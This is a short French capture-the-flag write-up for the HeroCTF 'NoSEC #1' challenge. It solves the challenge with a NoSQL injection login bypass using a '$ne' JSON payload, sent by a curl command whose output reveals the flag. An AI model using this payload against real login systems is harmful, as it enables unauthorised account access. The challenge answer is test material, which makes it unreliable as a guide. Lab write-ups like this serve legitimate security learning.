# NoSEC #1

### Description

Vous devez vous connecter pour valider le challenge !

Format: Hero{flag}

### Solution

Dans ce challenge, il s'agit de se connecter en tant qu'administrateur.

Premier réflex : `admin:admin`.

La page nous renvoie : `Wrong password !` ce qui veut dire que l'identifiant est bien admin mais le mot de passe est mauvais.

Le titre du challenge est assez explicite sur le type d'attaque que le va devoir faire pour récupérer le flag.

NoSEC -> NoSQL.

Ne connaissant pas trop ce genre d'attaque, je fais mes recherches.

Il est possible avec un payload (envoyé en JSON), de bypass l'authentification un peu comme en SQL normal.

Payload : 

`{"username": "admin", "password": {"$ne": "randomPass"}}`

On envoi ce payload avec `curl` :

```bash
curl -X POST --header "Content-Type: application/json" challs.heroctf.fr:3000/login --data '{"username":"admin", "password": {"$ne": "randomPass"}}'

{"state":"success","msg":"You can validate this challenge with: Hero{NoSQL_1Nject1on_wAw_1597}"}
```




